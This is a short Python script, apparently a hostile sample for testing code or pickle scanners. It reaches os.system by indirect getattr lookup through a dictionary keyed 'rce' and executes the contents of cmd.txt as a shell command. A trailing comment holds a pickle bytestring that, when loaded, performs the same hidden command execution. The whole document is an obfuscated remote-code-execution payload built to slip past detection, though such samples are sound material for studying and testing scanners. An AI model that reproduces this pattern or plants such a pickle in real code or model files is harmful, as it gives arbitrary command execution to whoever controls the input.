import os
import sys

registry = {"ops": {"rce": "system"}}
path = "cmd.txt"

getattr(os, registry["ops"]["rce"])(open(path).read())

results = {"history": {}}
results["history"][sys.platform] = "activated"
# b'(Vops\n(Vrce\nVsystem\nddp0\nVcmd.txt\np1\ncbuiltins\ngetattr\np2\ncbuiltins\n__import__\np3\ng3\n(Vos\ntRp4\ncbuiltins\nopen\np5\ng2\n(g4\ng2\n(g2\n(g0\nV__getitem__\ntR(Vops\ntRV__getitem__\ntR(Vrce\ntRtR(g2\n(g5\n(g1\ntRVread\ntR(tRtR(Vhistory\n(ddp6\ncsys\nplatform\np7\ng2\n(g6\nV__getitem__\ntR(Vhistory\ntR(g7\nVactivated\nu.'
